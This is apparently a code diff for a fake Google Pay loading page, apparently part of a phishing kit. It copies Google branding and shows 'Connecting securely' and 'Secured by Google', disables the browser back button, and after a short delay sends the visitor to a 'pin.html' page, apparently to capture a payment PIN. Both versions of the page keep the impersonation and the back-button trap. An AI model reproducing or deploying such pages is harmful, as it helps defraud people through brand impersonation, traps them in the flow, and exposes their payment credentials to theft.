@@ -1,156 +1,213 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Opening Google Pay</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Google Sans', -apple-system, sans-serif;
-            background: #f8f9fa;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        
-        .content {
-            text-align: center;
-            max-width: 400px;
-        }
-        
-        .logo-container {
-            margin-bottom: 32px;
-        }
-        
-        .logo-container svg {
-            width: 120px;
-            height: auto;
-        }
-        
-        .loading-text {
-            font-size: 24px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 12px;
-        }
-        
-        .status {
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 32px;
-        }
-        
-        .spinner-container {
-            margin: 32px 0;
-        }
-        
-        .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #e8eaed;
-            border-top: 4px solid #4285f4;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .progress-dots {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 24px;
-        }
-        
-        .dot {
-            width: 8px;
-            height: 8px;
-            background: #dadce0;
-            border-radius: 50%;
-            animation: pulse 1.4s ease-in-out infinite;
-        }
-        
-        .dot:nth-child(2) { animation-delay: 0.2s; }
-        .dot:nth-child(3) { animation-delay: 0.4s; }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 1; }
-        }
-        
-        .security-badge {
-            position: fixed;
-            bottom: 32px;
-            left: 50%;
-            transform: translateX(-50%);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #5f6368;
-            font-size: 14px;
-        }
-        
-        .security-badge svg {
-            width: 20px;
-            height: 20px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Google Pay</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      position: fixed;
+    }
+    
+    body {
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+    }
+    
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 15px;
+      box-sizing: border-box;
+    }
+    
+    .logo-container {
+      animation: fadeInScale 0.6s ease-out;
+      margin-bottom: 25px;
+    }
+    
+    .gpay-logo {
+      width: clamp(100px, 30vw, 140px);
+      height: auto;
+      animation: logoFloat 3s ease-in-out infinite;
+    }
+    
+    .loading-text {
+      margin-top: 30px;
+      font-size: clamp(16px, 4.5vw, 20px);
+      color: #5f6368;
+      opacity: 0;
+      animation: fadeInUp 0.8s 0.4s forwards;
+      font-weight: 500;
+      text-align: center;
+    }
+    
+    .status {
+      margin-top: 10px;
+      font-size: clamp(13px, 3.5vw, 15px);
+      color: #34a853;
+      opacity: 0;
+      animation: fadeInUp 0.8s 0.7s forwards;
+      font-weight: 600;
+      text-align: center;
+    }
+    
+    .spinner-container {
+      margin-top: 25px;
+      opacity: 0;
+      animation: fadeInUp 0.8s 1s forwards;
+    }
+    
+    .spinner {
+      width: 45px;
+      height: 45px;
+      border: 4px solid #f0f0f0;
+      border-top: 4px solid #4285f4;
+      border-right: 4px solid #34a853;
+      border-bottom: 4px solid #fbbc04;
+      border-left: 4px solid #ea4335;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+    }
+    
+    .progress-dots {
+      display: flex;
+      gap: 8px;
+      margin-top: 20px;
+      opacity: 0;
+      animation: fadeInUp 0.8s 1.3s forwards;
+    }
+    
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      animation: dotPulse 1.4s ease-in-out infinite;
+    }
+    
+    .dot:nth-child(1) {
+      background: #4285f4;
+      animation-delay: 0s;
+    }
+    
+    .dot:nth-child(2) {
+      background: #ea4335;
+      animation-delay: 0.2s;
+    }
+    
+    .dot:nth-child(3) {
+      background: #fbbc04;
+      animation-delay: 0.4s;
+    }
+    
+    .dot:nth-child(4) {
+      background: #34a853;
+      animation-delay: 0.6s;
+    }
+    
+    .security-badge {
+      position: absolute;
+      bottom: 25px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(52, 168, 83, 0.1);
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 12px;
+      color: #34a853;
+      font-weight: 600;
+    }
+    
+    @keyframes fadeInScale {
+      from { opacity: 0; transform: scale(0.5); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes logoFloat {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    @keyframes dotPulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.3); opacity: 0.5; }
+    }
+  </style>
 </head>
 <body>
-    <div class="content">
-        <div class="logo-container">
-            <svg viewBox="0 0 120 48" fill="none">
-                <path d="M28.4 18.5c-2.2 0-4.2 1.2-5.2 3l1.8 0.7c0.7-1.2 1.9-1.9 3.4-1.9 1.9 0 3.8 1.1 3.8 3.1v0.2c-0.7-0.4-2-0.9-3.8-0.9-3.5 0-7 1.9-7 5.5 0 3.3 2.9 5.4 6.1 5.4 2.5 0 3.9-1.1 4.7-2.4h0.1v1.9h2V23.6c0-4-3-5.1-5.9-5.1zm-0.3 13.1c-1.2 0-2.8-0.6-2.8-2 0-1.8 2-2.5 3.7-2.5 1.5 0 2.3 0.3 3.2 0.8-0.3 1.8-1.8 3.7-4.1 3.7z" fill="#4285F4"/>
-                <path d="M52.8 19l-4.5 11.4h-0.1L43.6 19h-2.2l6.2 14.1-3.5 7.8h2.1l9.6-21.9h-3z" fill="#EA4335"/>
-                <path d="M35.5 32.8c3.7 0 6.3-2.5 6.3-6.5s-2.6-6.5-6.3-6.5c-3.7 0-6.3 2.5-6.3 6.5s2.6 6.5 6.3 6.5zm0-1.9c-2.3 0-4.2-1.9-4.2-4.6s1.9-4.6 4.2-4.6 4.2 1.9 4.2 4.6-1.9 4.6-4.2 4.6z" fill="#FBBC04"/>
-                <path d="M19.8 32.8c3.7 0 6.3-2.5 6.3-6.5s-2.6-6.5-6.3-6.5c-3.7 0-6.3 2.5-6.3 6.5s2.6 6.5 6.3 6.5zm0-1.9c-2.3 0-4.2-1.9-4.2-4.6s1.9-4.6 4.2-4.6 4.2 1.9 4.2 4.6-1.9 4.6-4.2 4.6z" fill="#4285F4"/>
-                <path d="M8.4 19.5c-3.4 0-6.1 2.7-6.1 6.5s2.7 6.5 6.1 6.5c2.9 0 4.5-1.8 5.5-3.5l-1.8-0.8c-0.7 1.1-1.8 2.4-3.7 2.4-2.1 0-3.5-1.5-3.8-3.5h9.7c0.1-0.5 0.1-0.9 0.1-1.1 0-3.8-2.7-6.5-6-6.5zm0.1 1.9c1.5 0 2.6 0.9 3 2.2H5.4c0.4-1.5 1.7-2.2 3.1-2.2z" fill="#34A853"/>
-            </svg>
-        </div>
+  <div class="content">
+    <div class="logo-container">
+      <!-- Google Pay Logo Inline SVG -->
+      <svg class="gpay-logo" viewBox="0 0 512 200" xmlns="http://www.w3.org/2000/svg">
+        <!-- Google -->
+        <path d="M 116.91 77.27 Q 116.91 88.36 112.03 96.95 Q 107.15 105.55 99.09 110.43 Q 91.03 115.32 81.45 115.32 Q 71.97 115.32 63.91 110.48 Q 55.85 105.65 50.96 96.95 Q 46.08 88.25 46.08 77.27 Q 46.08 66.29 50.96 57.59 Q 55.85 48.89 63.91 44.06 Q 71.97 39.22 81.45 39.22 Q 91.03 39.22 99.09 44.11 Q 107.15 48.99 112.03 57.59 Q 116.91 66.18 116.91 77.27 Z M 102.83 77.27 Q 102.83 69.31 99.67 63.54 Q 96.52 57.77 91.26 54.66 Q 85.99 51.55 79.76 51.55 Q 73.53 51.55 68.26 54.66 Q 62.99 57.77 59.84 63.54 Q 56.68 69.31 56.68 77.27 Q 56.68 85.23 59.84 91.00 Q 62.99 96.77 68.26 99.88 Q 73.53 102.99 79.76 102.99 Q 85.99 102.99 91.26 99.88 Q 96.52 96.77 99.67 91.00 Q 102.83 85.23 102.83 77.27 Z" fill="#5F6368"/>
         
-        <div class="loading-text">Opening Google Pay?</div>
-        <div class="status">Processing your payment request</div>
+        <!-- Pay -->
+        <path d="M 220.00 77.00 L 220.00 112.00 L 208.00 112.00 L 208.00 42.00 L 241.00 42.00 Q 251.00 42.00 258.50 45.75 Q 266.00 49.50 270.00 56.25 Q 274.00 63.00 274.00 72.00 Q 274.00 81.00 270.00 87.75 Q 266.00 94.50 258.50 98.25 Q 251.00 102.00 241.00 102.00 L 220.00 102.00 L 220.00 77.00 Z M 220.00 90.00 L 241.00 90.00 Q 248.00 90.00 252.00 86.50 Q 256.00 83.00 256.00 77.00 Q 256.00 71.00 252.00 67.50 Q 248.00 64.00 241.00 64.00 L 220.00 64.00 L 220.00 90.00 Z" fill="#4285F4"/>
         
-        <div class="spinner-container">
-            <div class="spinner"></div>
-        </div>
+        <path d="M 320.00 115.00 Q 310.00 115.00 302.00 111.00 Q 294.00 107.00 289.50 99.50 Q 285.00 92.00 285.00 82.00 Q 285.00 72.00 289.50 64.50 Q 294.00 57.00 302.00 53.00 Q 310.00 49.00 320.00 49.00 Q 328.00 49.00 334.50 51.50 Q 341.00 54.00 345.50 58.50 L 337.00 68.00 Q 329.00 61.00 320.00 61.00 Q 313.00 61.00 307.50 64.50 Q 302.00 68.00 299.00 74.00 Q 296.00 80.00 296.00 87.00 Q 296.00 94.00 299.00 100.00 Q 302.00 106.00 307.50 109.50 Q 313.00 113.00 320.00 113.00 Q 329.00 113.00 337.00 106.00 L 345.50 115.50 Q 341.00 120.00 334.50 122.50 Q 328.00 125.00 320.00 125.00 Z" fill="#34A853"/>
         
-        <div class="progress-dots">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
+        <path d="M 390.00 50.00 L 390.00 125.00 L 378.00 125.00 L 378.00 118.00 Q 373.00 125.00 364.00 125.00 Q 356.00 125.00 350.00 121.50 Q 344.00 118.00 340.50 111.50 Q 337.00 105.00 337.00 96.00 L 337.00 50.00 L 348.00 50.00 L 348.00 94.00 Q 348.00 103.00 352.50 108.00 Q 357.00 113.00 364.00 113.00 Q 371.00 113.00 375.50 108.00 Q 380.00 103.00 380.00 94.00 L 380.00 50.00 L 390.00 50.00 Z" fill="#FBBC04"/>
+        
+        <path d="M 440.00 50.00 L 440.00 125.00 L 428.00 125.00 L 428.00 118.00 Q 423.00 125.00 414.00 125.00 Q 406.00 125.00 400.00 121.50 Q 394.00 118.00 390.50 111.50 Q 387.00 105.00 387.00 96.00 L 387.00 50.00 L 398.00 50.00 L 398.00 94.00 Q 398.00 103.00 402.50 108.00 Q 407.00 113.00 414.00 113.00 Q 421.00 113.00 425.50 108.00 Q 430.00 103.00 430.00 94.00 L 430.00 50.00 L 440.00 50.00 Z" fill="#EA4335"/>
+      </svg>
     </div>
     
-    <div class="security-badge">
-        <svg viewBox="0 0 24 24" fill="#34A853">
-            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
-        </svg>
-        <span>Secured by Google</span>
+    <div class="loading-text">Opening Google Pay…</div>
+    <div class="status">Connecting securely</div>
+    
+    <div class="spinner-container">
+      <div class="spinner"></div>
     </div>
+    
+    <div class="progress-dots">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+  
+  <div class="security-badge">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+    </svg>
+    <span>Secured by Google</span>
+  </div>
 
-    <script>
-        setTimeout(() => {
-            window.location.href = 'pin.html';
-        }, 2500);
-
-        // ??????? ???? ???? ?????
-        history.pushState(null, null, location.href);
-        window.onpopstate = function() {
-            history.go(1);
-        };
-    </script>
+  <script>
+    // Disable back button
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+      history.go(1);
+    };
+    
+    setTimeout(() => {
+      window.location.href = 'pin.html';
+    }, 2500);
+  </script>
 </body>
 </html>
